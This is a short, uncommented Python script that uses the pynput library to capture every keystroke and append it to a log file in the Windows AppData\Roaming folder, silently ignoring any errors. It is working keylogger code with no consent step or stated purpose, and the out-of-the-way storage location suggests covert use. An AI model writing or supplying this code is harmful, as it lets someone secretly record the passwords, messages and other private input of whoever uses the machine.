from pynput import keyboard
import os

log_file = os.path.expanduser("~") + "\\AppData\\Roaming\\log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(str(key) + "\n")
    except Exception as e:
        pass

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
